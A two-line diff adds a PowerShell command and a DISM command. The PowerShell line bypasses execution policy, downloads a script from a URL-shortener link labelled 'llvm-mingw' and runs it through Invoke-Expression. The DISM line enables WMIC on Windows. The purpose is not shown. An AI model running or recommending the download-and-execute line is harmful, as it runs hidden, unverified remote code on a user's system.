@@ -1,0 +1,2 @@
+powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('https://tinyurl.com/llvm-mingw') | IEX"
+C:\Windows\System32>DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
